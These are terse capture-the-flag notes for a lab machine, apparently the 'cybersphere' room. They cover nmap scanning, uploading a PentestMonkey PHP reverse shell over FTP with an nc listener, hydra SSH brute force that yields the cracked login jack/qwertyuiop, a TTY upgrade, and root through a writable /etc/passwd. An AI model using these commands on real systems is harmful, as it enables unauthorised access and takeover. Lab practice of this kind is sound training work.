Other players writeup
> https://kir0sploit.github.io/2023/02/cybersphere-writeup/

# Command and Techniques:

nmap -sC -p- -sV $IP -oN nmap.txt –vv
ftp: put reverse shell
> php PentestMonkey
> put the openvpn ip
> save the file on current dir

cd webalizer

put getin.php

bye

## Run reverseshell:

- attacker先run： nc -nlvp 8899
- run the reverse shell by running the web browser: 10.10.207.136/webalizer/getin.php

hydra  -l   jack  -P  /usr/share/wordlists/rockyou.txt   ssh://10.10.233.62

login: jack   password: qwertyuiop

goto /home we know that user is jack.
- we dont know the password
- use the hydra to bruteforce the ssh password
- after knowing the password, su jack
- execute interactive command:
	python2 -c 'import pty;pty.spawn("/bin/bash")'
	export TERM=xterm
	press CTRL + Z
	stty raw -echo;fg
- open new terminal: run another remote command
boom! get the jack shell

or

ssh jack@10.10.233.62 

run the Linpeas tool on the /tmp directory - to see which path is vulnerable that we could edit/modify

ls  -al  /etc/passwd

or

sudo -l

generate encryted password: openssl passwd [your password]

nano  /etc/passwd - paste the passwd on x

su root

